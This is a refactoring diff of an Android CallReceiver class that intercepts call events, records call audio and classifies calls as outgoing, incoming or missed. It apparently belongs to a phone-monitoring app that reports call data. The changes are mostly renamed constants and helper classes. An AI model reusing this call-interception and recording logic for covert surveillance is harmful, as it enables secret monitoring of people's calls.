@@ -14,11 +14,11 @@ import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 
 import com.inet.android.audio.RecordAudio;
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WhileTheMethod;
+import com.inet.android.utils.ValueWork;
 
 /**
  * Class get call
@@ -39,7 +39,7 @@ public class CallReceiver extends BroadcastReceiver {
 				"intent: " + intent.getAction() + " " + intent.getExtras(),
 				"intent: " + intent.getAction() + " " + intent.getExtras());
 
-		if (WhileTheMethod.getState(1, context) == 0)
+		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_CALL_REQUEST, context) == 0)
 			return;
 
 		Bundle bundle = intent.getExtras();
@@ -94,7 +94,7 @@ public class CallReceiver extends BroadcastReceiver {
 		}
 	}
 	private static void setRecord(){
-		recordAudio = new RecordAudio(-1, SOURCE_RECORD);
+		recordAudio = new RecordAudio(-1, SOURCE_RECORD, mContext);
 		recordAudio.executeRecording();
 	}
 	
@@ -124,15 +124,15 @@ public class CallReceiver extends BroadcastReceiver {
 
 		switch (dircode) {
 		case CallLog.Calls.OUTGOING_TYPE:
-			callTypeStr = ConstantRequest.TYPE_OUTGOING_CALL_REQUEST;
+			callTypeStr = ConstantValue.TYPE_OUTGOING_CALL_REQUEST;
 			break;
 
 		case CallLog.Calls.INCOMING_TYPE:
-			callTypeStr = ConstantRequest.TYPE_INCOMING_CALL_REQUEST;
+			callTypeStr = ConstantValue.TYPE_INCOMING_CALL_REQUEST;
 			break;
 
 		case CallLog.Calls.MISSED_TYPE:
-			callTypeStr = ConstantRequest.TYPE_MISSED_CALL_REQUEST;
+			callTypeStr = ConstantValue.TYPE_MISSED_CALL_REQUEST;
 			break;
 		}
 
